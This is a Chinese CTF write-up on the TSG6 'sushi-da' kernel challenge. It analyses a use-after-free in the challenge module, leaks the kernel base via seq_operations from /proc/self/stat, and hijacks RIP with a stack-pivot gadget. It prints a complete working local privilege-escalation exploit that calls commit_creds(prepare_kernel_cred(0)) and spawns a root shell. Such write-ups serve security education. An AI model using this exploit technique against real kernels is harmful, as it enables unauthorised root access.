# TSG6 sushi-da 内核部分分析

阅读量 **186176**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-21 17:30:11

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 0x1 开启的保护

`run.sh`:

    
    
    qemu-system-x86_64 \
      -kernel bzImage \
      -initrd rootfs.cpio \
      -nographic \
      -monitor none \
      -cpu qemu64 \
      -append "console=ttyS0 kaslr panic=1 nosmep nosmap pti=off quiet oops=panic" \
      -no-reboot \
      -m 256M \
      -s
    

调试的时候稍微做了修改，把`timeout`去掉了，加了调试参数。

文件系统解压之后的`init`：

    
    
    #!/bin/sh
    
    /bin/mount -t proc proc /proc
    /bin/mount -t sysfs sysfs /sys
    /bin/mount -t devtmpfs devtmpfs /dev
    /sbin/mdev -s
    
    mkdir -p /dev/pts
    mount -vt devpts -o gid=4,mode=620 none /dev/pts
    chmod 666 /dev/ptmx
    echo 1 > /proc/sys/kernel/kptr_restrict
    echo 1 > /proc/sys/kernel/dmesg_restrict
    
    mkdir /home
    mkdir /home/user
    chown 1000:1000 /home/user -R
    mv /flag* /home/user
    mv /client /home/user/client
    chown 1000:1000 /home/user/flag1
    chown 1000:1000 /home/user/flag2
    chown root:root /home/user/flag3
    chown 1000:1000 /home/user/client
    chmod 400 /home/user/flag*
    
    insmod /sushi-da.ko
    chmod 666 /dev/sushi-da
    echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
    echo -e "\n\n WELCOME TO SUSHIl 🍵🍣🍵\n\n"
    cd /home/user
    stty erase ''
    stty -echo
    setsid cttyhack setuidgid 1000 sh
    
    umount /proc
    umount /sys
    poweroff -d 0 -f
    

由于我是直接看的内核部分，所以，把启动程序换成了`sh`。

综上，开启的保护几乎没有，只有地址随机化KASLR。

## 0x2 源码分析

题目给了源码，好评QAQ！！

题目涉及的结构体：

    
    
    struct record{
      char date[0x10];
      unsigned long result;
    };    // 我们控制的结构体
    
    struct ioctl_register_query{
      struct record record;
    };    // 用于传入我们设计的结构体
    
    struct ioctl_fetch_query{
      unsigned rank;
      struct record record;
    };    // 用于查询输出我们需要的结构体
    

常规的菜单题目：

  * `register_record`:负责申请一个初始化为全零的堆块，放入列表里。
  * `fetch_record`:题目的结构体里面有一个`Rank`，函数计算出每个堆块的`Rank`，然后如果有我们指定的`Rank`，就会输出给我们对应`Rank`的堆块的内容。
  * `clear_old_records`:`free`一部分堆块，我们可以设计这写些可以被`free`的堆块。
  * `clear_all_records`:把堆块列表清空，不是`free`。

问题代码在`clear_old_records`:

    
    
    long clear_old_records(void)
    {
      int ix;
      char tmp[5] = {0};
      long date;
      for (ix = 0; ix != SUSHI_RECORD_MAX; ++ix)
      {
        if (records[ix] == NULL)
          continue;
        strncpy(tmp, records[ix]->date, 4);
        if (kstrtol(tmp, 10, &date) != 0 || date <= 1990)
          kfree(records[ix]);   // BUG : UAF
      }
      return 0;
    }
    

可以明显发现，这里的`kfree`的没有并没有在堆块列表里置零。造成UAF。

[题目源码](https://gist.github.com/Mech0n/af1d2a90ead0e15cdd82b9d20cd629bf)贴在这里好了。

## 0x3 漏洞利用

由于几乎什么保护也没开，所以我也就常规思路做，先考虑泄漏内核基地址，然后考虑控制RIP来劫持程序流。

这里有个结构体，恰好适合我们做各种操作。

`seq_operations`:[[source]](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#seq_operations)

> ## seq_operations
>
>   * サイズ：0x20 (kmalloc-32)
>   * base：4つの関数ポインタから好きなものを使ってリーク可能。
>   * heap：リークできない。
>   * stack：リークできない。
>   * RIP：例えば `start` を書き換えてreadを呼べばRIPがポン！ってなる。
>   * 確保：`single_open`を使うファイルを開く。`/proc/self/stat`とか。
>   * 解放：`close`する。
>   *
> 参考：<https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/seq_file.h#L32>
>

>  
>  
>     0x0000: 0xffffffff811c5f70
>     0x0008: 0xffffffff811c5f90
>     0x0010: 0xffffffff811c5f80
>     0x0018: 0xffffffff8120c3f0
>     [+] kbase = 0xffffffff81000000
>     Press enter to continue...
>     [    6.801190] BUG: unable to handle kernel paging request at
> 00000000deadbeef
>  

这个结构体，里面都是可以用来泄漏的内核基地址的函数指针，并且`read`函数可以用来劫持RIP，太合适了好吧。

使用方法：

    
    
    int victim = open("/proc/self/stat", O_RDONLY);
    char c;
    read(victim, &c, 1); // 劫持RIP
    

所以思路很明显了：

  * 通过UAF，申请一个堆块，`kfree`掉它，然后启动`/proc/self/stat`。
  * 输出这个被`kfree`的堆块的内容，就会输出这些函数指针。泄漏了内核基地址。
  * 然后再次`kfree`这个这个堆块，向里面放入我们需要的地址，来栈迁移。

关于栈迁移这里：

其实可以有很多`mov esp, 0xbalabala`的`gadget`，找一个合适的应该就好了吧，我选的是这一条：

    
    
    0xffffffff816216c0: mov esp, 0xf6ffac28; ret;
    

然后`mmap`出来这块空间，写入ROP链，说是ROP链，其实里面也就一个函数：

    
    
    size_t rop_chain[] = {
        get};
    
    static void get()
    {
        commit_creds(prepare_kernel_cred(0));
        asm volatile("swapgs ;"
                     "movq %0, 0x20(%%rsp)\t\n"
                     "movq %1, 0x18(%%rsp)\t\n"
                     "movq %2, 0x10(%%rsp)\t\n"
                     "movq %3, 0x08(%%rsp)\t\n"
                     "movq %4, 0x00(%%rsp)\t\n"
                     "iretq"
                     :
                     : "r"(user_ss),
                       "r"(user_sp),
                       "r"(user_rflags),
                       "r"(user_cs), "r"(pop_shell));
    
      void pop_shell(void)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        execve("/bin/sh", argv, envp);
    }
    

## 0x4 Exploit

    
    
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <errno.h>
    #include <stdlib.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/syscall.h>
    #include <poll.h>
    #include <unistd.h>
    #include <string.h>
    #include <sys/ioctl.h>
    #include <sys/prctl.h>
    #include <sys/shm.h>
    #include <sys/xattr.h>
    #include <sys/socket.h>
    
    #define SUSHI_REGISTER_RECORD 0xdead001
    #define SUSHI_FETCH_RECORD 0xdead002
    #define SUSHI_CLEAR_OLD_RECORD 0xdead003
    #define SUSHI_CLEAR_ALL_RECORD 0xdead004
    
    #define SUSHI_RECORD_MAX 0x10
    #define SUSHI_NAME_MAX 0x10
    
    struct record
    {
        char date[0x10];
        unsigned long result;
    };
    
    struct ioctl_register_query
    {
        struct record record;
    };
    
    struct ioctl_fetch_query
    {
        unsigned rank;
        struct record record;
    };
    
    #define errExit(msg)              \
        do                            \
        {                             \
            perror("[ERROR EXIT]\n"); \
            perror(msg);              \
            exit(EXIT_FAILURE);       \
        } while (0)
    
    #define WAIT(msg) \
        puts(msg);    \
        fgetc(stdin);
    
    unsigned long long user_cs, user_ss, user_sp, user_rflags;
    int fd; // file descriptor
    unsigned long long leak, kernbase, heapbase;
    unsigned long long base = 0xffffffff81194090;
    
    typedef unsigned long __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
    typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
    
    _commit_creds commit_creds = 0;
    _prepare_kernel_cred prepare_kernel_cred = 0;
    
    void pop_shell(void)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        execve("/bin/sh", argv, envp);
    }
    
    void save_status()
    {
        __asm__("mov %cs, user_cs;"
                "mov %ss, user_ss;"
                "mov %rsp, user_sp;"
                "pushf;"
                "pop user_rflags;"
                );
        puts("[*]status has been saved.");
    }
    
    static void get()
    {
        commit_creds(prepare_kernel_cred(0));
        asm volatile("swapgs ;"
                     "movq %0, 0x20(%%rsp)\t\n"
                     "movq %1, 0x18(%%rsp)\t\n"
                     "movq %2, 0x10(%%rsp)\t\n"
                     "movq %3, 0x08(%%rsp)\t\n"
                     "movq %4, 0x00(%%rsp)\t\n"
                     "iretq"
                     :
                     : "r"(user_ss),
                       "r"(user_sp),
                       "r"(user_rflags),
                       "r"(user_cs), "r"(pop_shell));
    }
    
    unsigned long long calc(unsigned long long addr)
    {
        return addr - base + kernbase;
    }
    
    int register_record(char *date, unsigned long result)
    {
        struct ioctl_register_query request;
        memcpy(request.record.date, date, 0x10);
        request.record.result = result;
        return ioctl(fd, SUSHI_REGISTER_RECORD, &request);
    }
    
    int fetch_record(struct ioctl_fetch_query *request)
    {
        return ioctl(fd, SUSHI_FETCH_RECORD, request);
    }
    
    int clear_old_records()
    {
        return ioctl(fd, SUSHI_CLEAR_OLD_RECORD, 0);
    }
    
    int clear_all_records()
    {
        return ioctl(fd, SUSHI_CLEAR_ALL_RECORD, 0);
    }
    
    int main(int argc, char const *argv[])
    {
        fd = open("/dev/sushi-da", O_RDWR);
        save_status();
    
        register_record("1970/12/24\x00", 1970);
    
        clear_old_records();
    
        int victim = open("/proc/self/stat", O_RDONLY);
    
        struct ioctl_fetch_query leak;
        leak.rank = 4;
        fetch_record(&leak);
    
        kernbase = *(unsigned long *)leak.record.date; // single_start
        printf("Leak single_start addr : %#llx\n", *(unsigned long long *)leak.record.date);
    
        commit_creds = calc(0xffffffff8106cd00);
        prepare_kernel_cred = calc(0xffffffff8106d110);
        printf("Leak commit_creds addr : %#llx\n", commit_creds);
        printf("Leak prepare_kernel_cred addr : %#llx\n", prepare_kernel_cred);
    
        unsigned long long *rop =
            (unsigned long long *)mmap(0xf6ffa000,
                                       0x8000,
                                       PROT_READ | PROT_EXEC | PROT_WRITE,
                                       MAP_ANON | MAP_PRIVATE | MAP_POPULATE,
                                       -1, 0);
        printf("Chain: %#llx\n", rop);
    
        unsigned long long chain[0x100];
    
        size_t rop_chain[] = {
            get};
    
        // double free
        clear_old_records();
    
        memcpy(0xf6ffac28, rop_chain, sizeof(rop_chain));
    
        struct ioctl_register_query request;
        memset(request.record.date, 0, 0x10);
        *(unsigned long long *)request.record.date = calc(0xffffffff816216c0);
        *((unsigned long long *)request.record.date + 1) = calc(0xffffffff816216c0);
        request.record.result = calc(0xffffffff816216c0);
    
        register_record((void *)request.record.date, 0xffffffffdeadc0c0);
    
        printf("Got Shell!\n");
    
        char c;
        read(victim, &c, 1);
        return 0;
    }
    
    // / # ffffffff8106cd00 T commit_creds
    // / # ffffffff8106d110 T prepare_kernel_cred
    // / # ffffffff81194090 t single_start
    
    // / # sushi_da 16384 0 - Live 0xffffffffc0000000 (O)
    
    // .text:000000000000002E                 call    kmem_cache_alloc_trace ; PIC mode
    // b *0xffffffffc000002e
    // .text:00000000000001B6                 call    kfree           ; PIC mode
    // b *0xffffffffc00001b6
    // .text:000000000000014D                 call    _copy_to_user   ; PIC mode
    // b *0xffffffffc000014d
    
    // 0xffff88800f2bd500
    
    // pwndbg> x/10gx 0xffff88800f2bd540
    // 0xffff88800f2bd540:     0x2f32312f30393931      0x6e6f657800003432
    // 0xffff88800f2bd550:     0x000000000000001e      0x0000000000000000
    
    // 0xffffffff816216c0: mov esp, 0xf6ffac28; ret;
    

![](https://img.vaala.cloud/images/2021/05/21/c4ecf691196e88a129499f27dbed3462.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Mech0n** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/241747](/post/id/241747)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [Kernel](/tag/Kernel)

 **+1** __0赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/KzQzkohK53IFYeFLAhDzPRyQaokQloq6jQzHm0ibhicibT8xdpjGpsJt8d7zic4Ggyrrl8NtxYdGbtNk2aBk0x7RiaA/132)
Mech0n

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

